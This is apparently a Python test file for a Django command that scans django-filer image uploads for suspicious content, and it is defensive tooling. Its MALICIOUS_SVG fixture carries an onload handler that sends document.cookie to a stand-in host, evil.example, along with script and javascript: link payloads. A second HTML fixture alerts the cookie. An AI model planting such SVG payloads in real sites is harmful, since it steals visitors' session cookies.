import csv
import io
import tempfile
from importlib import import_module
from io import StringIO
from pathlib import Path
from unittest.mock import patch

from django.apps import apps
from django.contrib.auth.models import User
from django.core.exceptions import ValidationError
from django.core.files.storage import FileSystemStorage
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.management import call_command
from django.core.management.base import CommandError
from django.test import TestCase
from django.utils import timezone

import pytest

from django_prosemirror.management.utils.check_filer_images import (
    _version_tuple,
    check_filer_images,
    check_image_file,
    check_svg_file,
)

try:
    import filer
    from filer import settings as filer_settings
    from filer.models import File, Image
    from PIL import Image as PILImage
except ModuleNotFoundError:
    pytest.skip("filer not available", allow_module_level=True)

# Before 3.5, filer's sanitize_svg isn't used, and validate_svg checks bytes.
FILER_35 = _version_tuple(filer.__version__) >= (3, 5)


def image_bytes(format="PNG", **save_kwargs):
    buffer = io.BytesIO()
    PILImage.new("RGB", (32, 32), color="red").save(
        buffer, format=format, **save_kwargs
    )
    return buffer.getvalue()


def animated_gif_bytes():
    frames = [PILImage.new("P", (16, 16), color=i) for i in range(3)]
    buffer = io.BytesIO()
    frames[0].save(buffer, format="GIF", save_all=True, append_images=frames[1:])
    return buffer.getvalue()


# Runs script when the SVG is opened directly in a browser (not via <img>).
MALICIOUS_SVG = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" height="100"
     onload="fetch('https://evil.example/?c=' + document.cookie)">
  <script type="text/javascript">alert(document.domain)</script>
  <a xlink:href="javascript:alert(1)"><rect width="100" height="100" fill="red"/></a>
</svg>
"""
BENIGN_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
    b'<rect width="10" height="10" fill="red"/></svg>'
)
PAYLOAD = b"<html><script>alert(document.cookie)</script></html>"


class CheckImageFileTests(TestCase):
    def test_valid_images_pass(self):
        cases = {
            "image.png": image_bytes("PNG"),
            "image.jpg": image_bytes("JPEG"),
            "progressive.jpg": image_bytes("JPEG", progressive=True),
            "image.gif": image_bytes("GIF"),
            "animated.gif": animated_gif_bytes(),
            "image.webp": image_bytes("WEBP"),
            "lossless.webp": image_bytes("WEBP", lossless=True),
        }
        for name, data in cases.items():
            with self.subTest(name):
                self.assertEqual(check_image_file(name, data), [])

    def test_files_the_upload_form_rejects_fail(self):
        cases = {
            "image.svg": MALICIOUS_SVG,
            "page.png": PAYLOAD,
            "image.bmp": image_bytes("BMP"),
            "mismatch.gif": image_bytes("PNG"),
            "truncated.png": image_bytes("PNG")[:50],
        }
        for name, data in cases.items():
            with self.subTest(name):
                self.assertNotEqual(check_image_file(name, data), [])


class CheckSvgFileTests(TestCase):
    @pytest.mark.skipif(not FILER_35, reason="needs django-filer 3.5")
    def test_malicious_svg_fails_validate_svg(self):
        results = check_svg_file("evil.svg", MALICIOUS_SVG, None)

        self.assertIn("cross site scripting", results["validate_svg"])
        # sanitize_svg strips the script instead of rejecting the file.
        self.assertIsNone(results["sanitize_svg"])

    @pytest.mark.skipif(not FILER_35, reason="needs django-filer 3.5")
    def test_benign_svg_passes(self):
        results = check_svg_file("image.svg", BENIGN_SVG, None)

        self.assertEqual(results, {"validate_svg": None, "sanitize_svg": None})

    @pytest.mark.skipif(not FILER_35, reason="needs django-filer 3.5")
    def test_unparseable_svg_fails_sanitize_svg(self):
        results = check_svg_file("broken.svg", b"<svg><unclosed></svg>", None)

        self.assertIn("incompatible format", results["sanitize_svg"])

    def test_without_sanitize_svg_before_filer_35(self):
        with patch.object(filer, "__version__", "3.4.4"):
            results = check_svg_file("evil.svg", MALICIOUS_SVG, None)

        self.assertEqual(list(results), ["validate_svg"])
        self.assertIn("cross site scripting", results["validate_svg"])

    @pytest.mark.skipif(not FILER_35, reason="needs django-filer 3.5")
    def test_non_utf8_svg_fails_validate_svg(self):
        results = check_svg_file("latin1.svg", b"<svg>\xe9</svg>", None)

        self.assertEqual(results["validate_svg"], "Not valid UTF-8.")

    def test_file_is_not_modified(self):
        data = bytearray(MALICIOUS_SVG)

        check_svg_file("evil.svg", bytes(data), None)

        self.assertEqual(data, MALICIOUS_SVG)


def create_filer_image(name, data, owner):
    return Image.objects.create(
        original_filename=name,
        file=SimpleUploadedFile(name, data),
        owner=owner,
    )


BASE_URL = "https://example.com"


# Validators for --validator, imported by dotted path.
def reject_gifs(image, data):
    if data.startswith(b"GIF8"):
        raise ValidationError(f"{image.original_filename} is a GIF.")


def reject_staff_uploads(image, data):
    if image.owner.is_staff:
        raise ValidationError("Uploaded by staff.")


NOT_CALLABLE = "not a validator"
VALIDATOR_PATH = f"{__name__}.reject_gifs"


class CheckFilerImagesCommandTests(TestCase):
    def setUp(self):
        self.staff = User.objects.create_user(
            username="staff", email="staff@example.com", is_staff=True
        )
        self.user = User.objects.create_user(username="user", email="user@example.com")

    def run_command(self, *args, base_url=BASE_URL):
        """Return stdout, stderr, and the CommandError message (or None).

        The exit status is stored in self.returncode.
        """
        if base_url:
            args = ("--base-url", base_url, *args)
        stdout, stderr = StringIO(), StringIO()
        try:
            call_command("check_filer_images", *args, stdout=stdout, stderr=stderr)
        except CommandError as exc:
            error = str(exc)
            self.returncode = exc.returncode
        else:
            error = None
            self.returncode = 0
        return stdout.getvalue(), stderr.getvalue(), error

    def csv_rows(self, *args):
        stdout, _, _ = self.run_command("--format", "csv", *args)
        return {row["ID"]: row for row in csv.DictReader(StringIO(stdout))}

    def assertVerdict(self, image, verdict, reason, *args):
        row = self.csv_rows(*args)[str(image.pk)]
        self.assertEqual((row["Verdict"], row["Reason"]), (verdict, reason))

    def test_verdicts(self):
        png = image_bytes("PNG")
        cases = {
            "photo.jpg": (image_bytes("JPEG"), "OK", "JPEG image"),
            "photo.png": (png, "OK", "PNG image"),
            "animated.gif": (animated_gif_bytes(), "OK", "GIF image"),
            "evil.svg": (
                MALICIOUS_SVG,
                "SUSPICIOUS",
                "SVG with possible scripts: onload=, <script, javascript:",
            ),
            "embedded.svg": (
                b'<svg><image href="data:image/png;base64,AAAA"/></svg>',
                "SUSPICIOUS",
                "SVG with possible scripts: ;base64,",
            ),
            "latin1.svg": (
                b"<svg>\xe9</svg>",
                "SUSPICIOUS",
                "SVG that can't be checked: not UTF-8",
            ),
            "logo.svg": (BENIGN_SVG, "NOTE", "SVG without scripts"),
            "broken.svg": (
                b"<svg><unclosed></svg>",
                "NOTE",
                # Before filer 3.5, damage isn't detected.
                "Damaged SVG, without scripts" if FILER_35 else "SVG without scripts",
            ),
            "page.png": (PAYLOAD, "SUSPICIOUS", "Not an image, served as image/png"),
            "page.html": (PAYLOAD, "SUSPICIOUS", "Not an image, served as text/html"),
            "notes.qqq": (
                b"Hello",
                "SUSPICIOUS",
                "Not an image, saved as .qqq (unknown content type)",
            ),
            "notes": (
                b"Hello",
                "SUSPICIOUS",
                "Not an image, saved as a file without extension",
            ),
            "photo.html": (
                png,
                "SUSPICIOUS",
                "PNG image saved as .html, served as text/html",
            ),
            "empty.png": (b"", "NOTE", "Empty file"),
            "renamed.gif": (png, "NOTE", "PNG image saved as .gif"),
            "photo": (png, "NOTE", "PNG image saved as a file without extension"),
            "old.bmp": (image_bytes("BMP"), "NOTE", "Unsupported format: BMP"),
            "truncated.png": (png[:50], "NOTE", "Damaged PNG image"),
        }
        for name, (data, verdict, reason) in cases.items():
            with self.subTest(name):
                image = create_filer_image(name, data, self.staff)

                self.assertVerdict(image, verdict, reason)

    def test_upload_policy_rejection_is_suspicious(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        config = apps.get_app_config("filer")

        with patch.object(config, "MIME_TYPE_WHITELIST", ["image/jpeg"]):
            row = self.csv_rows()[str(image.pk)]

        self.assertEqual(row["Verdict"], "SUSPICIOUS")
        self.assertTrue(
            row["Reason"].startswith("Rejected by the upload validation: "),
            row["Reason"],
        )

    def test_upload_size_limit_does_not_apply(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        with self.settings(DJANGO_PROSEMIRROR={"max_image_upload_size": 10}):
            self.assertVerdict(image, "OK", "PNG image")

    def test_table_lists_images_that_need_attention_worst_first(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        logo = create_filer_image("logo.svg", BENIGN_SVG, self.staff)
        evil = create_filer_image("evil.svg", MALICIOUS_SVG, self.user)

        stdout, _, error = self.run_command("--hide-ok")

        lines = stdout.splitlines()
        self.assertEqual(len(lines), 4)  # header, separator, two images
        self.assertEqual(
            lines[0].split(),
            ["Verdict", "ID", "Uploaded", "Uploaded", "by", "Staff", "File"]
            + ["Reason", "Admin", "page"],
        )
        self.assertTrue(set(lines[1]) <= {"-", " "})
        uploaded_on = timezone.localdate(evil.uploaded_at).isoformat()
        self.assertEqual(
            lines[2].split()[:6],
            [
                "SUSPICIOUS",
                str(evil.pk),
                uploaded_on,
                "user@example.com",
                "no",
                "evil.svg",
            ],
        )
        self.assertTrue(
            lines[2].endswith(f"{BASE_URL}/admin/filer/image/{evil.pk}/change/")
        )
        self.assertEqual(lines[3].split()[:2], ["NOTE", str(logo.pk)])
        self.assertEqual(
            error, "Checked 3 images: 1 suspicious, 0 unchecked, 1 note, 1 OK."
        )
        self.assertEqual(self.returncode, 3)

    def test_table_lists_all_images_by_default(self):
        photo = create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        logo = create_filer_image("logo.svg", BENIGN_SVG, self.staff)

        stdout, _, _ = self.run_command()

        lines = stdout.splitlines()
        self.assertEqual(
            [line.split()[:2] for line in lines[2:]],
            [["NOTE", str(logo.pk)], ["OK", str(photo.pk)]],
        )

    def test_nothing_suspicious(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        create_filer_image("logo.svg", BENIGN_SVG, self.staff)

        stdout, stderr, error = self.run_command()

        self.assertIsNone(error)
        self.assertEqual(len(stdout.splitlines()), 4)  # header, separator, two images
        self.assertIn(
            "Checked 2 images: 0 suspicious, 0 unchecked, 1 note, 1 OK. "
            "Nothing suspicious found.",
            stderr,
        )

    def test_no_table_if_ok_images_are_hidden_and_all_are_ok(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        stdout, stderr, error = self.run_command("--hide-ok")

        self.assertEqual(stdout, "")
        self.assertIsNone(error)
        self.assertIn("Nothing suspicious found.", stderr)

    def test_csv_can_hide_ok_images(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        logo = create_filer_image("logo.svg", BENIGN_SVG, self.staff)

        self.assertEqual(list(self.csv_rows("--hide-ok")), [str(logo.pk)])

    def test_csv_columns(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        rows = self.csv_rows()

        self.assertEqual(
            rows[str(image.pk)],
            {
                "Verdict": "OK",
                "ID": str(image.pk),
                "Filename": "photo.png",
                "Uploaded at": timezone.localtime(image.uploaded_at).isoformat(
                    timespec="seconds"
                ),
                "Uploaded by": "staff@example.com",
                "Uploader is current staff member": "yes",
                "Reason": "PNG image",
                (
                    "Admin page (don't open SUSPICIOUS or UNCHECKED files "
                    "in the browser)"
                ): f"{BASE_URL}/admin/filer/image/{image.pk}/change/",
                "File URL (don't open SUSPICIOUS or UNCHECKED files in the browser)": (
                    f"{BASE_URL}{image.url}"
                ),
            },
        )

    def test_uploader_without_email_or_owner(self):
        no_email = User.objects.create_user(username="no-email")
        cases = {"no email": (no_email, "no-email"), "no owner": (None, "")}
        for label, (owner, expected) in cases.items():
            with self.subTest(label):
                image = create_filer_image("photo.png", image_bytes("PNG"), owner)

                row = self.csv_rows()[str(image.pk)]

                self.assertEqual(row["Uploaded by"], expected)

    def test_ok_image_by_uploader_who_is_not_current_staff_is_a_note(self):
        former_staff = User.objects.create_user(
            username="former", is_staff=True, is_active=False
        )
        cases = {
            "non-staff": self.user,
            "inactive staff": former_staff,
            "no owner": None,
        }
        for label, owner in cases.items():
            with self.subTest(label):
                image = create_filer_image("photo.png", image_bytes("PNG"), owner)

                row = self.csv_rows()[str(image.pk)]

                self.assertEqual(
                    (
                        row["Verdict"],
                        row["Reason"],
                        row["Uploader is current staff member"],
                    ),
                    ("NOTE", "Uploaded by member who's not currently staff", "no"),
                )

    def test_uploader_who_is_not_current_staff_does_not_change_other_verdicts(
        self,
    ):
        cases = {
            "evil.svg": (
                MALICIOUS_SVG,
                "SUSPICIOUS",
                "SVG with possible scripts: onload=, <script, javascript:",
            ),
            "logo.svg": (BENIGN_SVG, "NOTE", "SVG without scripts"),
        }
        for name, (data, verdict, reason) in cases.items():
            with self.subTest(name):
                image = create_filer_image(name, data, self.user)

                self.assertVerdict(image, verdict, reason)

    def test_validator_failure_by_uploader_who_is_not_current_staff(self):
        image = create_filer_image("anim.gif", animated_gif_bytes(), self.user)

        self.assertVerdict(
            image,
            "SUSPICIOUS",
            f"{VALIDATOR_PATH}: anim.gif is a GIF.",
            "--validator",
            VALIDATOR_PATH,
        )

    def test_relative_urls_need_a_base_url(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        stdout, _, error = self.run_command(base_url="")

        self.assertEqual(stdout, "")
        self.assertEqual(
            error,
            f"Can't make the URL '/admin/filer/image/{image.pk}/change/' absolute. "
            "Pass --base-url.",
        )
        self.assertEqual(self.returncode, 1)

    def test_writes_report_to_output_file(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        with tempfile.TemporaryDirectory() as tmp_dir:
            path = Path(tmp_dir) / "report.csv"
            stdout, stderr, error = self.run_command(
                "--format", "csv", "--output", str(path)
            )
            content = path.read_text(encoding="utf-8")

        self.assertEqual(stdout, "")
        self.assertIsNone(error)
        self.assertEqual(len(list(csv.DictReader(StringIO(content)))), 1)
        self.assertIn(
            "Checked 1 image: 0 suspicious, 0 unchecked, 0 notes, 1 OK.", stderr
        )

    def test_table_in_output_file_is_not_colored(self):
        create_filer_image("evil.jpg", b"<html></html>", self.staff)

        with tempfile.TemporaryDirectory() as tmp_dir:
            path = Path(tmp_dir) / "report.txt"
            self.run_command("--force-color", "--output", str(path))
            content = path.read_text(encoding="utf-8")

        self.assertIn("SUSPICIOUS", content)
        self.assertNotIn("\x1b[", content)

    def test_summary_goes_to_stderr(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        stdout, stderr, error = self.run_command("--format", "csv")

        self.assertNotIn("Checked", stdout)
        self.assertIn(
            "Checked 1 image: 0 suspicious, 0 unchecked, 0 notes, 1 OK. "
            "Nothing suspicious found.",
            stderr,
        )
        self.assertIsNone(error)

    def test_files_missing_from_storage_are_notes(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        image.file.storage.delete(image.file.name)

        _, stderr, error = self.run_command()

        self.assertVerdict(image, "NOTE", "File missing from storage")
        self.assertIsNone(error)
        self.assertIn("Nothing suspicious found.", stderr)

    def test_unreadable_files_are_unchecked(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        cases = {
            "file exists": {},
            # Can't tell whether the file exists, so it may exist.
            "exists() fails": {"exists": OSError("Storage unavailable")},
        }
        for label, errors in cases.items():
            with (
                self.subTest(label),
                patch.object(
                    FileSystemStorage, "_open", side_effect=PermissionError("Denied")
                ),
                patch.object(
                    FileSystemStorage,
                    "exists",
                    side_effect=errors.get("exists"),
                    return_value=True,
                ),
            ):
                stdout, _, error = self.run_command()

                self.assertVerdict(
                    image, "UNCHECKED", "Could not read the file: Denied"
                )
                self.assertEqual(stdout.splitlines()[2].split()[0], "UNCHECKED")
                self.assertEqual(
                    error,
                    "Checked 1 image: 0 suspicious, 1 unchecked, 0 notes, 0 OK. "
                    "Nothing suspicious found, but 1 image could not be checked; "
                    "run again once the files can be read.",
                )
                self.assertEqual(self.returncode, 4)

    def test_suspicious_takes_precedence_for_the_exit_status(self):
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        create_filer_image("evil.svg", MALICIOUS_SVG, self.staff)
        storage_open = FileSystemStorage._open

        def open_all_but_pngs(storage, name, *args, **kwargs):
            if name.endswith(".png"):
                raise PermissionError("Denied")
            return storage_open(storage, name, *args, **kwargs)

        with patch.object(FileSystemStorage, "_open", open_all_but_pngs):
            _, _, error = self.run_command()

        self.assertEqual(
            error, "Checked 2 images: 1 suspicious, 1 unchecked, 0 notes, 0 OK."
        )
        self.assertEqual(self.returncode, 3)

    def test_record_without_file(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        Image.objects.filter(pk=image.pk).update(file="")

        self.assertVerdict(image, "NOTE", "No file")

    def test_validator_failure_makes_the_image_suspicious(self):
        gif = create_filer_image("anim.gif", image_bytes("GIF"), self.staff)
        png = create_filer_image("photo.png", image_bytes("PNG"), self.staff)

        stdout, _, error = self.run_command(
            "--format", "csv", "--validator", VALIDATOR_PATH
        )

        rows = {row["ID"]: row for row in csv.DictReader(StringIO(stdout))}
        self.assertEqual(
            (rows[str(gif.pk)]["Verdict"], rows[str(gif.pk)]["Reason"]),
            ("SUSPICIOUS", f"{VALIDATOR_PATH}: anim.gif is a GIF."),
        )
        self.assertEqual(rows[str(png.pk)]["Verdict"], "OK")
        self.assertEqual(
            error, "Checked 2 images: 1 suspicious, 0 unchecked, 0 notes, 1 OK."
        )

    def test_validator_failure_comes_before_notes(self):
        image = create_filer_image("photo.gif", image_bytes("PNG"), self.staff)
        other_path = f"{__name__}.reject_staff_uploads"

        self.assertVerdict(
            image,
            "SUSPICIOUS",
            f"{other_path}: Uploaded by staff. | PNG image saved as .gif",
            "--validator",
            other_path,
        )

    def test_multiple_validators(self):
        create_filer_image("anim.gif", image_bytes("GIF"), self.staff)
        other_path = f"{__name__}.reject_staff_uploads"

        stdout, _, _ = self.run_command(
            "--format", "csv", "--validator", VALIDATOR_PATH, "--validator", other_path
        )

        row = next(csv.DictReader(StringIO(stdout)))
        self.assertEqual(
            row["Reason"],
            f"{VALIDATOR_PATH}: anim.gif is a GIF. | {other_path}: Uploaded by staff.",
        )

    def test_validators_skip_unreadable_files(self):
        image = create_filer_image("anim.gif", image_bytes("GIF"), self.staff)
        image.file.storage.delete(image.file.name)

        stdout, _, _ = self.run_command(
            "--format", "csv", "--validator", VALIDATOR_PATH
        )

        row = next(csv.DictReader(StringIO(stdout)))
        self.assertEqual(row["Reason"], "File missing from storage")

    def test_checks_the_configured_image_model(self):
        image = create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        document = File.objects.create(
            original_filename="notes.txt",
            file=SimpleUploadedFile("notes.txt", b"Hello"),
            owner=self.staff,
        )
        # Defines ImageEditForm, which needs filer's image model, before it is
        # swapped below; the check imports it on first use.
        import_module("django_prosemirror.forms.filer")

        # filer.File stands in for a custom image model. Unlike filer.Image,
        # it also holds the plain file.
        with patch.object(filer_settings, "FILER_IMAGE_MODEL", "filer.File"):
            checks = list(check_filer_images(base_url=BASE_URL))

        self.assertEqual([check.pk for check in checks], [image.pk, document.pk])

    def test_invalid_validator_paths(self):
        cases = {
            "missing module": (
                "nonexistent.module.check",
                "Can't import validator 'nonexistent.module.check':",
            ),
            "missing attribute": (
                f"{__name__}.missing",
                f"Can't import validator '{__name__}.missing':",
            ),
            "not callable": (
                f"{__name__}.NOT_CALLABLE",
                f"Validator '{__name__}.NOT_CALLABLE' is not callable.",
            ),
        }
        create_filer_image("photo.png", image_bytes("PNG"), self.staff)
        for label, (path, expected_error) in cases.items():
            with self.subTest(label):
                stdout, _, error = self.run_command("--validator", path)

                self.assertEqual(stdout, "")
                self.assertTrue(error.startswith(expected_error), error)
                self.assertEqual(self.returncode, 1)
